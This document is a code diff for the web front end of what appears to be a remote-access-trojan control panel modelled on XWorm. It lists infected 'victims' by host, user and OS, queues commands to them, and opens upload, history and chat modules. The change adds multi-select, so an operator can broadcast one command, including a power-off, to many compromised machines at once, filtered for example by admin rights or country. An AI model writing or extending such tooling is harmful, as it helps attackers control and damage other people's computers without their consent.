@@ -9,6 +9,12 @@ const state = {
   sort: { key: "idle", dir: 1 },
   filter: "",
   selected: null,
+  // Multi-select mirrors the XWorm grid: ctrl/shift to build a set, right-click
+  // to fire one command at all of them. Kept by agent id, so a grid refresh
+  // never drops a pick.
+  multi: new Set(),
+  lastPick: null,
+  visible: [],
   windows: new Map(),
   timer: null
 };
@@ -113,11 +119,15 @@ function render() {
 
   const tb = $("rows");
   tb.innerHTML = "";
+  state.visible = rows;
   for (const v of rows) {
     const tr = document.createElement("tr");
+    const picked = state.multi.has(v.id);
     if (state.selected === v.id) tr.className = "sel";
+    if (picked) tr.className = (tr.className ? tr.className + " " : "") + "picked";
     const st = statusOf(v);
     tr.innerHTML = `
+      <td class="pick"><input type="checkbox"${picked ? " checked" : ""}></td>
       <td><span class="dot ${st}"></span>${esc(v.host || "?")}</td>
       <td>${esc(v.username || "-")}</td>
       <td>${esc(v.os || "-")}</td>
@@ -130,6 +140,7 @@ function render() {
       <td>${esc(v.tag || "")}</td>`;
     tr.addEventListener("contextmenu", (e) => e.preventDefault());
     tr.addEventListener("mousedown", (e) => {
+      const box = e.target && e.target.tagName === "INPUT";
       if (e.button === 2) {
         // the document-level closer also listens on mousedown: it saw this
         // same event bubble up, found the target outside #menu and closed it
@@ -138,9 +149,36 @@ function render() {
         e.stopPropagation();
         state.selected = v.id;
         render();
-        openMenu(e.clientX, e.clientY, v);
+        // right-click on a picked row acts on the whole selection; on any other
+        // row it acts on that row alone, so one stray right-click never fires a
+        // command at six machines
+        const targets =
+          state.multi.has(v.id) && state.multi.size > 1
+            ? rows.filter((r) => state.multi.has(r.id))
+            : [v];
+        openMenu(e.clientX, e.clientY, targets);
+      } else if (box) {
+        // let the native checkbox toggle, then mirror it into the set
+        e.stopPropagation();
+        setTimeout(() => pick(v.id, !state.multi.has(v.id)), 0);
+      } else if (e.shiftKey && state.lastPick) {
+        const ids = rows.map((r) => r.id);
+        const a = ids.indexOf(state.lastPick);
+        const b = ids.indexOf(v.id);
+        if (a >= 0 && b >= 0)
+          for (let i = Math.min(a, b); i <= Math.max(a, b); ++i) state.multi.add(ids[i]);
+        state.lastPick = v.id;
+        state.selected = v.id;
+        render();
+      } else if (e.ctrlKey || e.metaKey) {
+        if (state.multi.has(v.id)) state.multi.delete(v.id);
+        else state.multi.add(v.id);
+        state.lastPick = v.id;
+        state.selected = v.id;
+        render();
       } else {
         state.selected = v.id;
+        state.lastPick = v.id;
         render();
       }
     });
@@ -159,6 +197,27 @@ function render() {
     .map((v) => Number(v.ping_ms) || 0)
     .filter(Boolean);
   $("s-lat").textContent = pings.length ? Math.round(Math.max(...pings) / 1000) + " s" : "—";
+
+  // Drop picks whose agent left the console, then mirror the set into the bar.
+  const live = new Set(state.victims.map((v) => v.id));
+  for (const id of [...state.multi]) if (!live.has(id)) state.multi.delete(id);
+
+  const n = state.multi.size;
+  $("pickcount").textContent = n ? n + " sélectionné" + (n > 1 ? "s" : "") : "0";
+  $("pickbar").classList.toggle("show", n > 0);
+  const all = $("pick-all");
+  if (all) {
+    all.checked = rows.length > 0 && rows.every((r) => state.multi.has(r.id));
+    all.indeterminate = !all.checked && rows.some((r) => state.multi.has(r.id));
+  }
+}
+
+// Single entry point for changing a pick, so the checkbox, the ctrl-click and
+// the header tri-state can never drift apart.
+function pick(id, on) {
+  if (on) state.multi.add(id);
+  else state.multi.delete(id);
+  render();
 }
 
 async function tick() {
@@ -326,15 +385,19 @@ document.addEventListener("keydown", (e) => {
   if (e.key === "Escape") closeMenus();
 });
 
-function openMenu(x, y, victim) {
+function openMenu(x, y, victims) {
   closeMenus();
+  const many = victims.length > 1;
   const el = document.createElement("div");
   el.id = "menu";
   el.style.display = "block";
 
   const head = document.createElement("div");
   head.className = "head";
-  head.textContent = (victim.host || "?") + " · " + (victim.username || "-");
+  head.textContent = many
+    ? victims.length + " postes · " + victims.map((v) => v.host || "?").slice(0, 3).join(", ") +
+      (victims.length > 3 ? "…" : "")
+    : (victims[0].host || "?") + " · " + (victims[0].username || "-");
   el.appendChild(head);
 
   for (const group of MODULES) {
@@ -350,7 +413,7 @@ function openMenu(x, y, victim) {
       mi.innerHTML = `<span>${mod.label}</span>`;
       mi.addEventListener("click", () => {
         closeMenus();
-        dispatch(victim, mod);
+        dispatch(victims, mod);
       });
       sub.appendChild(mi);
     }
@@ -370,11 +433,12 @@ function openMenu(x, y, victim) {
   del.innerHTML = `<span style="color:#f88">Supprimer la victime</span>`;
   del.addEventListener("click", async () => {
     closeMenus();
-    if (!confirm("Supprimer " + victim.host + " de la console ?")) return;
+    if (many) return;  // one target, one delete: never a bulk wipe by accident
+    if (!confirm("Supprimer " + victims[0].host + " de la console ?")) return;
     await api("/api/remove", {
       method: "POST",
       headers: { "content-type": "application/json" },
-      body: JSON.stringify({ vid: victim.id })
+      body: JSON.stringify({ vid: victims[0].id })
     });
     tick();
   });
@@ -387,14 +451,17 @@ function openMenu(x, y, victim) {
 }
 
 // ---------------------------------------------------------------- dispatch --
-function dispatch(victim, mod) {
-  if (mod.verb === "_uploads") return openUploads(victim);
-  if (mod.verb === "_history") return openHistory(victim);
-  if (mod.verb === "_chat") return openChat(victim);
+function dispatch(victims, mod) {
+  const one = victims[0];
+  if (mod.verb === "_uploads") return openUploads(one);
+  if (mod.verb === "_history") return openHistory(one);
+  if (mod.verb === "_chat") return openChat(one);
 
   // The registry marks verbs that end the session or wipe state. A misfired
-  // right-click on "Éteindre" should not power off a machine mid-job.
-  if (mod.danger && !confirm(mod.label + " sur " + (victim.host || victim.id) + " ?")) return;
+  // right-click on "Éteindre" should not power off a machine mid-job, and the
+  // prompt names the count so a broadcast is never mistaken for a single shot.
+  const scope = victims.length > 1 ? victims.length + " postes" : (one.host || one.id);
+  if (mod.danger && !confirm(mod.label + " sur " + scope + " ?")) return;
 
   let args = mod.args || "";
   if (mod.prompt) {
@@ -402,16 +469,29 @@ function dispatch(victim, mod) {
     if (value === null) return;
     args = value;
   }
-  send(victim, mod.verb, args);
-  openModule(victim, mod.verb, mod.label);
+  // Sequential on purpose: a broadcast to six agents is six rows in the queue,
+  // and firing them in parallel only reorders the console log for nothing.
+  void (async () => {
+    for (const v of victims) await sendRaw(v, mod.verb, args);
+    tick();
+    for (const v of victims) openModule(v, mod.verb, mod.label);
+  })();
+}
+
+async function sendRaw(victim, verb, args) {
+  try {
+    await api("/api/queue", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ vid: victim.id, verb, args: args || "" })
+    });
+  } catch (e) {
+    /* one dead target must not abort the rest of a broadcast */
+  }
 }
 
 async function send(victim, verb, args) {
-  await api("/api/queue", {
-    method: "POST",
-    headers: { "content-type": "application/json" },
-    body: JSON.stringify({ vid: victim.id, verb, args: args || "" })
-  });
+  await sendRaw(victim, verb, args);
   tick();
 }
 
@@ -575,7 +655,27 @@ async function beat() {
     beatBusy = false;
   }
 }
+// ---- selection bar -------------------------------------------------------
+// The header box drives every visible row, so a filtered grid lets you select
+// "all the ADMIN ones in FR" instead of clicking twenty rows.
+$("pick-all").addEventListener("change", (e) => {
+  if (e.target.checked) for (const v of state.visible) state.multi.add(v.id);
+  else for (const v of state.visible) state.multi.delete(v.id);
+  render();
+});
+
+$("pick-clear").addEventListener("click", () => {
+  state.multi.clear();
+  render();
+});
+
+$("pick-menu").addEventListener("click", (e) => {
+  const targets = state.victims.filter((v) => state.multi.has(v.id));
+  if (!targets.length) return;
+  const r = e.currentTarget.getBoundingClientRect();
+  openMenu(r.left, r.bottom + 4, targets);
+});
+
 loadActions();
 beat();
 setInterval(beat, 3000);
-state.timer = setInterval(tick, 5000);
